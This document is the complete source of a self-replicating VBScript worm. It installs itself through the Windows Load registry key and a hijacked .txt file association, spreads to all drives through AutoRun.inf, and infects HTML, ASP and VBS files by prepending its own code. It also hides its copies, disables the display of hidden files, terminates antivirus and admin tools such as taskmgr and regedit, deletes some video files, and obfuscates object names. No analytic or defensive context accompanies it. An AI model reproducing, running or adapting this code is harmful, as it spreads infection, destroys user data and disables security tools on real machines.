'$Top_2
Dim Cnt, CntMax, Maxsize,Path_V1,Path_V2,Name_V1,Version
Cnt = 0
CntMax = 150
Maxsize = 150000
Name_V1 = "{HCQ9D-TVCWX-X9QRG-J4B2Y-GR2TT-CM3HY-26VYW-6JRYC-X66GX-JVY2D}.vbs"
Path_V1 = GetSFolder(1) & Name_V1 '0:Windows 1:System  2:Temp 
Path_V2 = GetSFolder(0) & Name_V1
Version="2" 


Call Main()

Sub Main()
    On Error Resume Next
    If IsVbs() = true Then
        Call ExeVbs()     
    ElseIf IsHtml() = true Then
        Call ExeWebPage() 
    End If
End Sub

Sub ExeWebPage()
    On Error Resume Next
    Dim objfso,vbsCode,SFSO
    SFSO="Vfulswlqj1IlohV|vwhpRemhfw" 

    Set objfso = CreateObject(DeCode(SFSO)) 

    vbsCode = GetScriptCode("vbscript")   
    Call DeSafeSet()     
    Call InvadeSystem(objfso,vbsCode)                            
    Set objfso = Nothing
End Sub


Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced
    Dim HCUExplorer
    HLMShow= "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"    
    Call WriteReg (HCUExplorer, 129, "REG_DWORD")   
    Call WriteReg (HCUAdvanced,0,"REG_DWORD")     
    Call WriteReg (HLMShow,0,"REG_DWORD")       
End Sub

Sub SetFileAttr(f, pathf)
    Dim vf
    Set vf = f.GetFile(pathf)
    vf.Attributes = 6
End Sub

Sub CopyFile(f, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = f.OpenTextFile(pathf, 2, true)
    vf.Write code
End Sub

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select

        End If
    Next
End Function

Sub ExeVbs()
    On Error Resume Next
    Dim objfso,objshell,FullPath_Self,Name_Self,vbsCode
    Dim ArgNum,Para_V,oArgs,SubPara_V,RunPath
    Dim FullPath_OK,SFSO 
 
    FullPath_OK= GetSFolder(0) & "OK.ini" 
    SFSO="Vfulswlqj1IlohV|vwhpRemhfw" 

    Set objfso = CreateObject(DeCode(SFSO)) 
    Set objshell = CreateObject("wscript.shell")    
    Call InitializeVBS(objfso, objshell)  
      
    Name_Self =WScript.ScriptName          
    FullPath_Self = WScript.ScriptFullName           
    If Name_Self = Name_V1 Then           
        Set oArgs = WScript.Arguments 
        ArgNum = 0
        Do While ArgNum < oArgs.Count
            Para_V = Para_V & " " & oArgs(ArgNum)
            ArgNum = ArgNum + 1
        Loop  
      
        SubPara_V = Lcase(Right(Para_V,3))          
            Select Case SubPara_V
            Case  "run"
                         
                RunPath = left(FullPath_Self,2)  
                Call Run(RunPath) 
                
                vbsCode = GetSelfCode(objfso, FullPath_Self) 
                Call InvadeSystem(objfso,vbsCode) 
                Call Run(Path_V1)                                     
                 
            Case  "txt" 
                RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V   
                Call Run(RunPath) 
                            
                vbsCode = GetSelfCode(objfso, FullPath_Self) 
                Call InvadeSystem(objfso,vbsCode) 
                Call Run(Path_V1) 
                
            Case Else            
                If PreInstance = True Then 
                    WScript.Quit
                End If
        
                vbsCode = GetSelfCode(objfso, FullPath_Self)
                Call InvadeSystem(objfso,vbsCode)                                              
                
                If  objfso.FileExists(FullPath_OK) = False or IsOK(objfso,Date(), FullPath_OK) =False Then
                     Call DeSafeSet()                                       
                     Call SearchDrives(objfso,vbsCode) 
                     Call OK(objfso,Date(), FullPath_OK)                          
                End If
                 
                Call Monitor(objfso,vbsCode)              
            End Select                                                  
        Else                                                          
            vbsCode = GetSelfCode(objfso, FullPath_Self)       
            Call InvadeSystem(objfso,vbsCode) 
            Call Run(Path_V1)
            
    End If 
    Set objfso = Nothing
    Set objshell = Nothing   
End Sub

Sub InitializeVBS(f, Shell)
    On Error Resume Next
    Dim T
    T=Shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout") 
    If (T>=1) Then 
        Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"  
    End if     
     
End Sub

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

Function IsOK(fso,Now_V,path_f)
    Dim vf
    IsOK = False
    Set vf = fso.OpenTextFile(path_f,1)   
    If vf.readline ="OK" And InStr(vf.readline ,Now_V) >0 Then
        IsOK = True
    ElseIf InStr(vf.readline, "Admin") >0 Then
        msgbox  "You are Admin!!!"
        IsOK = True   
    End If                                    
End Function 

Sub OK(fso,Now_V,path_f)
    Dim vf
    Set vf = fso.OpenTextFile(path_f,2,True)
    vf.write "OK" & vbcrlf
    vf.Writeline Now_V    
    Call SetFileAttr(fso,path_f)  
End Sub

Sub Monitor(objfso,vbsCode)
    On Error Resume Next 
    Dim dc,d  
    ProcessNames = Array("ras.exe","360tray.exe","taskmgr.exe","regedit.exe","msconfig.exe","SREng.exe","USBAntiVir.exe")      
    Do      
        Call KillProcess(ProcessNames)       
        Call InvadeSystem(objfso,vbsCode)       
        Set dc = objfso.Drives 
        For Each d In dc      
                Call AutoRun(objfso, d.DriveLetter,vbsCode)             
        Next             
        WScript.sleep 10000
    Loop
    
End Sub

Sub AutoRun(f, D,vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs,inf_autorun
    path_autorun = D & ":\AutoRun.inf" 'AutoRun.inf完整路径
    path_vbs = D & ":\" & Name_V1   
     
    If f.FileExists(path_vbs) = false or f.FileExists(path_autorun) = False Then 
        
        If f.FileExists(path_autorun) = true Then
            f.DeleteFile path_autorun, True
        End If      
        If f.FileExists(path_vbs) = true Then
            f.DeleteFile path_vbs, True
        End If 
        
        Call CopyFile(f, vbsCode, path_vbs) 
        Call SetFileAttr(f, path_vbs) 
                 
        inf_autorun = "[AutoRun]" & vbCrLf & "shell\AutoRun=打开(A)" & vbCrLf & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(f, inf_autorun, path_autorun)
        Call SetFileAttr(f, path_autorun)       
    End If
End Sub

Function IsVbs()
    On Error Resume Next
    Dim TErr
    TErr = WScript.ScriptFullName 
    If Err Then
        Err.Clear
        IsVbs = false
    Else
        IsVbs = true
    End If
End Function

Function IsHtml()
    On Error Resume Next
    Dim TErr
    TErr = document.Location 
    If Err Then
        Err.Clear
        IsHtml = false
    Else
        IsHtml = true
    End If
End Function

Function GetVersion(f,path_v)
    Dim buffer ,fv ,n
    Set fv=f.OpenTextFile(path_v, 1)
    buffer=fv.ReadALL()
    n = InStr(buffer, "'$Top")
    GetVersion=Mid(buffer,n+6,1)
End Function

Sub InvadeSystem(f,vbsCode)
    On Error Resume Next
    Dim Value,dc,d,HCULoad   
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"           
    If f.FileExists(Path_V1) = True  Then 
        If GetVersion(f,Path_V1)<Version Then  
            f.DeleteFile Path_V1 ,True
        End If        
    End If

    If f.FileExists(Path_V1) = false  Then        
        Call CopyFile(f, vbsCode, Path_V1) 
        Call SetFileAttr(f, Path_V1)            
    End If 
    

    If ReadReg(HCULoad)<> Path_V1 Then 
        Call WriteReg (HCULoad, Path_V1, "") 
    End If
    

    If f.FileExists(Path_V2) = false  Then        
        Call CopyFile(f, vbsCode, Path_V2) 
        Call SetFileAttr(f, Path_V2)            
    End If  
                
    Value = "%SystemRoot%\System32\WScript.exe " & """" & Path_V2 & """" & " %1 %* "
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then  
        Call SetTxtFileAss(Path_V2) 
    End If
    
    If ReadReg(HCULoad)<> Path_V1 And ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then 
        Set dc = f.Drives 
        For Each d In dc
                Call AutoRun(f, d.DriveLetter,vbsCode)
        Next       
    End If    
End Sub

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Function GetSelfCode(f, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = f.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, "'$Top")
    n1 = InstrRev(buffer, "'$Bottom")
    buffer = Mid(buffer, n, n1 - n + 8)
    GetSelfCode = buffer
    Self.Close
End Function

Sub SearchDrives(f,vbsCode)
    On Error Resume Next
    Dim d ,dc
    Set dc = f.Drives
    For Each d In dc
        If Cnt >= CntMax Then '
            Exit For
        End If
        If (d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3) And d.DriveLetter <> "C" Then                   
                Call SearchFile(f, d.Path & "\",vbsCode)
        End If
    Next
End Sub


Sub SearchFile(f, strPath,vbsCode)
    On Error Resume Next
    Dim pfo,pf,pfi,ext
    Dim psfo,ps
    Set pfo = f.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then 
            Exit For
        End If
        ext = LCase(f.GetExtensionName(pfi.Path))
                   
        Select Case ext
            Case "htm" ,"html","asp","vbs":           
                Call InfectHead(pfi.Path, pfi, f, vbsCode, ext)
            Case "mpg", "rmvb", "avi", "rm" :            
            If IsSexFile(pfi.Name) = True Then
                pfi.Delete
            End If            
        End Select
    Next

    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then 
            Exit For
        End If
        Call SearchFile(f, ps.Path,vbsCode) 
    Next
End Sub

Function IsSexFile(fname)
    IsSexFile = false
    If InStr(fname, "成人")>0 Or InStr(fname, "淫")>0 Or InStr(fname, "偷拍")>0 Or _
                InStr(fname, "偷窥")>0 Or InStr(fname, "口交")>0 Or InStr(fname, "强奸")>0 Or _
                InStr(fname, "轮奸")>0 Or InStr(fname, "伦理片")>0 Or InStr(fname, "自摸")>0 Then
        IsSexFile = true
    End If
End Function

Function Isinfected(buffer, ftype)
    Isinfected = true
    Select Case ftype
        Case "htm" , "html" , "asp", "vbs":
            If InStr(buffer, "'$Top") = 0 Then
                Isinfected = false
            End If
        Case Else
            Isinfected = true
    End Select
End Function

Sub InfectHead(strPath, fi, f, vbsCode, ftype)
    On Error Resume Next
    Dim tso, buffer,strCode
    If fi.Size< Maxsize Then 
        Set tso = f.OpenTextFile(strPath, 1, true)
        buffer = tso.ReadAll()
        tso.Close
        Select Case ftype
            Case "htm" , "html" , "asp":
            If Isinfected(buffer, ftype) = false Then 
                strCode = MakeScript(vbsCode, 0) 
                Set tso = f.OpenTextFile(strPath, 2, true)
                Cnt = Cnt + 1
                tso.Write strCode & vbCrLf & buffer 
                tso.Close
                Set tso = Nothing
            End If
            Case "vbs":
            If Isinfected(buffer, ftype) = false Then 
                n = InStr(buffer , "Option Explicit") 
                If n<>0 Then
                    buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                    Set tso = f.OpenTextFile(strPath, 2, true)
                    tso.Write vbsCode & vbCrLf & buffer 
                    Cnt = Cnt + 1
                    tso.Close
                    Set tso = Nothing
                Else
                    Set tso = f.OpenTextFile(strPath, 2, true)
                    tso.Write vbsCode & vbCrLf & buffer 
                    Cnt = Cnt + 1
                    tso.Close
                    Set tso = Nothing
                End If
            End If
            Case Else
        End Select
    End If

End Sub

Function GetSF(f, p)
    On Error Resume Next
    GetSF = f.GetSpecialFolder(p) & "\"
End Function

Function GetSFolder(p)
    On Error Resume Next
    Dim f
    Set f = CreateObject("Scripting.FileSystemObject")
    GetSFolder = f.GetSpecialFolder(p) & "\"
    Set f = Nothing
End Function

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = EnCode(strCode)
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & vbCrLf & strCode & vbCrLf & "</" & "SCRIPT>"
    End If

End Function

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIService.execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            objProcess.terminate()
        Next
    Next
End Sub

Sub DeleteReg(strkey)
    On Error Resume Next
    Set tmps = CreateObject("wscript.shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub

Function ReadReg(strkey)
    On Error Resume Next
    Dim tmps
    Set tmps = CreateObject("wscript.shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function

Sub WriteReg(strkey, Value, vtype)
    On Error Resume Next
    Dim tmps
    Set tmps = CreateObject("wscript.shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub

Sub Run(ExeFullName)
    On Error Resume Next
    Dim WshShell
    Set WshShell = WScript.CreateObject("wscript.shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub

Function DeCode(Coded)
On Error Resume Next 
For i= 1 To Len(Coded) 
      Curchar=Mid(Coded,i,1) 
      If Asc(Curchar) = 16 then 
             Curchar=chr(8) 
      Elseif Asc(Curchar) = 24 then 
             Curchar=chr(12) 
      Elseif Asc(Curchar) = 32 then 
             Curchar=chr(18) 
      Else 
             Curchar=chr(Asc(Curchar)-3) 
      End if 

DeCode=Decode & Curchar
Next 
End Function 
'$Bottom